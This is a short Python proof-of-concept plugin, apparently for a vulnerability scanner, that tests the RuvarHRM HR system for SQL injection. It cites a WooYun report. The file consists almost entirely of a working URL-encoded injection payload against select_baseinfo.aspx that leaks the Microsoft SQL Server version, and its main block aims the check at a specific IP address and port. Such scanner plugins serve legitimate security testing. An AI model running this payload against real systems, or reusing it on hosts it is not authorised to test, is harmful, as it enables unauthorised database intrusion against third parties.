#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:  RuvarHRM人力资源管理系统SQL注入
#Refer:http://www.wooyun.org/bugs/wooyun-2015-0150075
#Author:xq17
def assign(service,arg):
    if service=="ruvarhrm":
        return True,arg
    
def audit(arg):
    payload = "RuvarHRM/web_include/select_baseinfo.aspx?bt_name=1%27)AND%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)%3E0--"
    url=arg+payload
    code, head, res, errcode,finalurl =  curl.curl(url)
    if  code!=0 and "GAO JI@Microsoft SQL Server" in res:
        security_hole('find sql injection: ' + arg)

                

if  __name__ == '__main__':
    from dummy import *
    audit(assign("ruvarhrm","http://121.32.133.30:8081/")[1])